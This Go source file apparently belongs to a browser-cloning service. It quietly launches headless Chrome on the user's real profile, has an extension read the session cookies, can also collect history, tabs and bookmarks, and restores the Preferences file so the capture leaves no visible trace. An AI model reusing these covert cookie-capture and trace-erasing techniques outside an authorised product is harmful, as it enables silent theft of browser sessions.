// Runner executes a Plan. It is the only place in the silent path that starts a
// process, and the only place that stops one, so the two rules it must never
// break live here in one readable place:
//
//	STOP ONLY WHAT WE STARTED. A wake is stopped by PID (its own PID and its
//	children). Never by image name: `taskkill /IM chrome.exe`, which the revoke
//	path uses on the hosted PC, would close the user's own browser windows on
//	their own laptop. That is the single worst outcome this feature could have.
//
//	LEAVE NO TRACE. The profile's Preferences file is snapshotted before the
//	launch and restored byte-for-byte afterwards, because Chrome marks a session
//	unclean at startup and we deliberately stop it. Without the restore the
//	user's next normal launch may offer "Restore pages?" for a capture they never
//	knew about — a visible artefact, i.e. a silence failure.
//
// Every OS touch is behind a seam (Launcher, Waiter, file paths), so the whole
// sequence is provable by tests on Linux with no Windows browser anywhere.
package wake

import (
	"context"
	"fmt"

	"os"
	"time"
)

// Process is one browser instance this runner started.
type Process interface {
	// PID identifies the process tree to stop. It is used for the stop and for
	// the audit line, never to signal anything else.
	PID() int
	// Stop ends THIS process tree only (implementations: taskkill /PID on
	// Windows, SIGTERM→SIGKILL on Unix). It must be idempotent and must not
	// return an error when the process is already gone.
	Stop() error
	// Exited reports whether the process is already gone, so the runner can skip
	// a stop that is no longer meaningful.
	Exited() bool
}

// Launcher starts a browser. Production runs the binary directly — never through
// a shell — with procattr.Quiet so no console flashes; tests record the call and
// return a fake process.
type Launcher interface {
	Start(binary string, args []string) (Process, error)
}

// Timeouts bounds each stage. The values are deliberately tight: a wake is the
// one moment the user's own profile is held by a process they cannot see, so it
// is measured in seconds, not minutes.
type Timeouts struct {
	// RequestTTL is how long a written request stays claimable.
	RequestTTL time.Duration
	// WakeWait is how long a woken browser may take to answer before it is
	// stopped again. It must comfortably exceed the extension's poll floor:
	// chrome.alarms cannot fire faster than 30s, but the service worker also
	// polls immediately on startup, so a healthy wake answers in a few seconds.
	WakeWait time.Duration
	// PollEvery is the result-polling interval.
	PollEvery time.Duration
}

// DefaultTimeouts are the production values.
func DefaultTimeouts() Timeouts {
	return Timeouts{
		RequestTTL: DefaultRequestTTL,
		WakeWait:   60 * time.Second,
		PollEvery:  250 * time.Millisecond,
	}
}

// RunResult is the outcome: counts-only, plus what the runner had to do to get
// them. It is safe to log and safe to render.
type RunResult struct {
	// Route is the Plan's route, so the caller can tell "read locally" from
	// "woke the browser".
	Route Route `json:"route"`
	// Reason is a named failure reason, "" on success.
	Reason string `json:"reason,omitempty"`
	// Plan is the decision, including the exact argv when a wake happened.
	Plan Plan `json:"plan"`
	// Result is the capture counts (zero when no capture happened).
	Result CaptureResult `json:"result"`
	// NeedsLocalRead is true for file-copy / dpapi: the caller must do the
	// out-of-process read itself (cookiedump); no browser process was started.
	NeedsLocalRead bool `json:"needs_local_read"`
	// Woke / Stopped / Restored record the side effects, for the audit trail.
	Woke     bool `json:"woke"`
	Stopped  bool `json:"stopped"`
	Restored bool `json:"restored"`
	// RestoreUnverified is set when Preferences was snapshotted but could not be
	// put back AND re-read as identical. It is a warning, not a failure: the
	// capture may well have succeeded, but the user's next launch could show a
	// "Restore pages?" prompt, which is exactly what the snapshot exists to
	// prevent — so it is surfaced rather than swallowed.
	RestoreUnverified bool `json:"restore_unverified,omitempty"`
	// PID is the process this runner started and stopped, 0 if it started none.
	PID int `json:"pid,omitempty"`
	// ElapsedMS is the wall time the wake held the profile.
	ElapsedMS int64 `json:"elapsed_ms,omitempty"`
	// State reports the OTHER half: the profile's files. Absent means state was not
	// requested for this capture (rather than "nothing changed"), so a console can
	// tell those two apart.
	State *StateUploadResult `json:"state,omitempty"`
}

// Runner drives one capture. The zero value is not usable; build it with
// NewRunner or set the fields explicitly (tests do the latter).
type Runner struct {
	// Launcher starts the browser. Required for a wake.
	Launcher Launcher
	// Waiter provides time (and the sleep used while polling for a result).
	Waiter Waiter
	// RequestPath / ResultPath are the mailbox files (see request.go/result.go).
	RequestPath string
	ResultPath  string
	// PreferencesPath is <profile>/Preferences. Empty disables the snapshot and
	// restore, which is correct for a profile that has no Preferences (Firefox).
	PreferencesPath string
	// OnWoke is called with the started process's PID immediately after a
	// successful launch. It exists so a caller can register an interrupt
	// handler that stops the process if the broker is killed mid-capture; the
	// runner still stops it on its normal path. Optional.
	OnWoke func(pid int)
	// StateSync, when set, ALSO carries the profile's state (history, bookmarks,
	// tabs, extensions) after the session capture. Nil disables the state half
	// entirely, which is what keeps every existing caller byte-identical: a
	// capture that does not ask for state never walks the filesystem.
	StateSync *StateSyncOptions
}

// NewRunner wires the production seams.
func NewRunner(l Launcher, w Waiter, requestPath, resultPath, preferencesPath string) *Runner {
	return &Runner{
		Launcher:        l,
		Waiter:          w,
		RequestPath:     requestPath,
		ResultPath:      resultPath,
		PreferencesPath: preferencesPath,
	}
}

// Run decides, then acts.
//
// TWO HALVES, ONE ENTRY POINT. The route machinery below is the SESSION half
// (cookies, read in-process by the extension). The STATE half — history,
// bookmarks, tabs, extensions — is FILES, and it runs AFTERWARDS, whatever the
// route decided. The two are independent on purpose: a refused cookie capture must
// not cost the user their tabs, and a failed state transfer must not cost them
// their session. Doing the state sync HERE, rather than inside each route branch,
// is what guarantees it happens for every route — including the refusals, which
// return early and would otherwise silently skip it.
func (r *Runner) Run(in Input, cloneJobID, jobSource string, t Timeouts) RunResult {
	out := r.run(in, cloneJobID, jobSource, t)
	if r.StateSync == nil {
		// Not requested. Nil keeps every existing caller and test byte-identical:
		// a capture that does not ask for state never touches the filesystem.
		return out
	}
	state := SyncState(context.Background(), *r.StateSync)
	out.State = &state
	return out
}

// run is the route decision and the session capture.
func (r *Runner) run(in Input, cloneJobID, jobSource string, t Timeouts) RunResult {
	if t.WakeWait <= 0 {
		t = DefaultTimeouts()
	}
	now := r.Waiter.Now()
	plan := Decide(in)
	out := RunResult{Route: plan.Route, Plan: plan}

	switch plan.Route {
	case RouteRefused:
		out.Reason = plan.Reason
		return out

	case RouteFileCopy, RouteDPAPI:
		// No process, so nothing to start or stop: the caller reads the files
		// itself (cookiedump) and posts the jar the way it always has.
		out.NeedsLocalRead = true
		return out

	case RouteExtension:
		// The browser is already running, so the extension reads in-process. No
		// launch: a second instance onto a locked profile is both wrong and the
		// one way a visible window could appear on the user's desktop.
		res, ok, reason := r.requestAndWait(plan, cloneJobID, jobSource, "", t, now)
		if !ok {
			out.Reason = reason
			return out
		}
		out.Result = res
		if res.Status != "success" {
			out.Reason = reasonOr(res.Reason, "capture_failed")
		}
		return out

	case RouteHeadlessWake:
		return r.wake(plan, cloneJobID, jobSource, t, now)
	}
	out.Reason = ReasonCaptureUnavailable
	return out
}

// requestAndWait writes the mailbox request and waits for the reader to answer.
// At most ONE request is ever outstanding — a new one overwrites any old file —
// so a crash cannot leave a queue of surprises behind.
func (r *Runner) requestAndWait(plan Plan, cloneJobID, jobSource, nonce string, t Timeouts, now time.Time) (CaptureResult, bool, string) {
	RemoveResults(r.ResultPath)
	req, err := WriteRequest(r.RequestPath, CaptureRequest{
		Nonce:      nonce,
		CloneJobID: cloneJobID,
		Browser:    plan.Browser,
		Source:     jobSource,
	}, t.RequestTTL, now)
	if err != nil {
		return CaptureResult{}, false, ReasonRequestMalformed
	}
	res, ok, reason := WaitForResult(r.ResultPath, req.Nonce, now.Add(t.WakeWait), t.PollEvery, r.Waiter)
	if !ok {
		// The request is spent either way: never leave one lying around for a
		// later, unannounced capture.
		_ = os.Remove(r.RequestPath)
		return CaptureResult{}, false, reason
	}
	return res, true, ""
}

// reasonOr falls back when a result carries no reason of its own.
func reasonOr(reason, fallback string) string {
	if reason != "" {
		return reason
	}
	return fallback
}

// silenceGuard rejects any plan that could put something on the user's screen, or
// that is not a launch plan at all (see ValidateWake).
func silenceGuard(plan Plan) error {
	if err := plan.ValidateWake(); err != nil {
		return fmt.Errorf("%s: %w", ReasonWakeNotSilent, err)
	}
	return nil
}

// wake is the closed-browser path: start a HEADLESS instance on the real
// profile, let the extension read the jar, then stop exactly what we started and
// put the profile back.
func (r *Runner) wake(plan Plan, cloneJobID, jobSource string, t Timeouts, now time.Time) RunResult {
	out := RunResult{Route: plan.Route, Plan: plan}
	if err := silenceGuard(plan); err != nil {
		// A plan that is not provably window-free is refused, never launched.
		out.Reason = ReasonWakeNotSilent
		return out
	}
	if r.Launcher == nil {
		out.Reason = ReasonWakeFailed
		return out
	}

	// 1. Snapshot BEFORE anything else: once the browser starts, Preferences
	//    already records an unclean session.
	snapshot, mode, hadSnapshot := snapshotFile(r.PreferencesPath)

	// 2. Request BEFORE the launch. The service worker polls as soon as it
	//    starts, so a request written after the launch would be missed and the
	//    wake would answer "nothing to do" and quit — the classic ordering bug
	//    in this kind of handshake.
	RemoveResults(r.ResultPath)
	req, err := WriteRequest(r.RequestPath, CaptureRequest{
		CloneJobID: cloneJobID,
		Browser:    plan.Browser,
		Source:     jobSource,
	}, t.RequestTTL, now)
	if err != nil {
		out.Reason = ReasonRequestMalformed
		return out
	}

	// 3. Launch: headless, direct exec (never through a shell), no console.
	started := r.Waiter.Now()
	proc, err := r.Launcher.Start(plan.Binary, plan.Args)
	if err != nil {
		_ = os.Remove(r.RequestPath)
		out.Reason = ReasonWakeFailed
		return out
	}
	out.Woke = true
	out.PID = proc.PID()
	if r.OnWoke != nil {
		r.OnWoke(proc.PID())
	}

	// 4. Wait for the extension to answer.
	res, ok, reason := WaitForResult(r.ResultPath, req.Nonce, started.Add(t.WakeWait), t.PollEvery, r.Waiter)
	out.ElapsedMS = r.Waiter.Now().Sub(started).Milliseconds()

	// 5. Stop what we started and restore the profile. This runs on EVERY path
	//    below the launch, including the timeout: a headless browser left
	//    running would hold the user's profile lock indefinitely and block their
	//    own next launch.
	r.stopAndRestore(proc, snapshot, mode, hadSnapshot, &out)

	if !ok {
		_ = os.Remove(r.RequestPath)
		out.Reason = reason
		return out
	}
	out.Result = res
	if res.Status != "success" {
		out.Reason = reasonOr(res.Reason, "capture_failed")
	}
	return out
}

// snapshotFile reads a file and its mode, for a byte-exact restore. A file that
// cannot be read is reported as absent: restoring nothing is the safe default,
// and inventing content would be worse than doing nothing.
func snapshotFile(path string) ([]byte, os.FileMode, bool) {
	if path == "" {
		return nil, 0, false
	}
	blob, err := os.ReadFile(path)
	if err != nil {
		return nil, 0, false
	}
	mode := os.FileMode(0o600)
	if fi, err := os.Stat(path); err == nil {
		mode = fi.Mode().Perm()
	}
	return blob, mode, true
}

// stopAndRestore ends the process we started and puts Preferences back, then
// re-reads it to prove the restore. Both halves matter equally: an unstopped
// browser blocks the user's own launch, and an unrestored Preferences can show
// them a "Restore pages?" prompt caused by a capture they never saw.
func (r *Runner) stopAndRestore(proc Process, snapshot []byte, mode os.FileMode, hadSnapshot bool, out *RunResult) {
	if proc != nil && !proc.Exited() {
		if err := proc.Stop(); err == nil {
			out.Stopped = true
		}
	}
	if !hadSnapshot {
		return
	}
	if err := os.WriteFile(r.PreferencesPath, snapshot, mode); err != nil {
		out.RestoreUnverified = true
		return
	}
	back, err := os.ReadFile(r.PreferencesPath)
	if err != nil {
		out.RestoreUnverified = true
		return
	}
	want, errWant := ReadExitState(snapshot)
	got, errGot := ReadExitState(back)
	if errWant != nil || errGot != nil || got != want {
		out.RestoreUnverified = true
		return
	}
	out.Restored = true
}

// realWaiter is the production Waiter: real time, real sleeping.
type realWaiter struct{}

func (realWaiter) Now() time.Time        { return time.Now().UTC() }
func (realWaiter) Sleep(d time.Duration) { time.Sleep(d) }

// RealWaiter returns the time-backed Waiter used in production.
func RealWaiter() Waiter { return realWaiter{} }
